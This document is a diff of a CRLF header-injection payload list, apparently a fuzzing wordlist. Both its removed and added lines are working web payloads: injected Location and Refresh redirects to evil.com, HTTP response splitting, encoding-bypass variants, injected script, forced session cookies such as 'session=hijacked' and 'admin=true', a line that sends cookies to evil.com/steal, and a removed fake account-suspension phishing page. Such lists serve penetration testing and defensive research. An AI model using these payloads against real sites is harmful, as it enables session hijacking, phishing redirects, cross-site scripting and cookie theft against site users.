@@ -1,20 +1,45 @@
-%0d%0aLocation: https://evil.com
-%0aLocation: https://evil.com
-%0dLocation: https://evil.com
-\r\nLocation: https://evil.com
-\nLocation: https://evil.com
+%0d%0aLocation: http://evil.com/
+%0aLocation: http://evil.com/
 
-?url=x%0d%0aHTTP/1.1 302 Found%0d%0aLocation: https://evil.com%0d%0a%0d%0a
+Location: http://evil.com/
 
-?redirect=https://evil.com%0d%0aX-Forwarded-For: 127.0.0.1
+Location: http://evil.com/
+%0d%0aLocation: https://evil.com/
+%0d%0aLocation: //evil.com/
+%0d%0aLocation: javascript:alert(1)
+%0d%0aLocation: data:text/html,<script>alert(1)</script>
+%0d%0aLocation: http://evil.com/steal?c=COOKIE
+%0d%0aLocation: http://phishing.com/
+%0d%0aRefresh: 0; url=http://evil.com/
+%0d%0aRefresh: 0; url=https://evil.com/
+%0d%0aRefresh: 0; url=//evil.com/
+%0d%0aRefresh: 0; url=javascript:alert(1)
+%0d%0a%0d%0aHTTP/1.1 302 Found%0d%0aLocation: http://evil.com/%0d%0a%0d%0a
+%0d%0aHTTP/1.1 301 Moved Permanently%0d%0aLocation: http://evil.com/
+%0d%0a%0d%0a<html><body><script>location='http://evil.com/'</script></body></html>
+%250d%250aLocation: http://evil.com/
+%25250d%25250aLocation: http://evil.com/
+%E5%98%8D%E5%98%8ALocation: http://evil.com/
+%E5%98%8ALocation: http://evil.com/
+%c0%8dLocation: http://evil.com/
+%c0%8aLocation: http://evil.com/
+test%0d%0aLocation: http://evil.com/
+/test%0d%0aLocation: http://evil.com/
+?next=%0d%0aLocation: http://evil.com/
+?url=%0d%0aLocation: http://evil.com/
+?redirect=%0d%0aLocation: http://evil.com/
+?returnUrl=%0d%0aLocation: http://evil.com/
+?continue=%0d%0aLocation: http://evil.com/
+?goto=%0d%0aLocation: http://evil.com/
+%0d%0aLocation: http://evil.com/%0d%0aSet-Cookie: session=hijacked
+%0d%0aLocation: http://evil.com/%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
 
-?url=x%0d%0a%0d%0a<html><h1>Your account has been suspended. <a href=https://evil.com/login>Click here to restore</a></h1></html>
 
-?x=1%0d%0aCache-Control: max-age=99999%0d%0aX-Cache-Key: /admin
+HTTP/1.1 200 OK
+Content-Type: text/html
 
-?username=admin%0d%0aGET /stolen HTTP/1.1%0d%0aHost: target.com
+<script>alert(1)</script>
 
-/path/%0D%0ASet-Cookie:+admin=1
-?redirect=%0aSet-Cookie:+session=hacked;+HttpOnly=false
-
-/path?x=%0D%0A%0D%0AHTTP/1.1+200+OK%0D%0AContent-Type:+text/html%0D%0A%0D%0A<h1>Injected</h1>
+Location: http://evil.com/
+Set-Cookie: admin=true
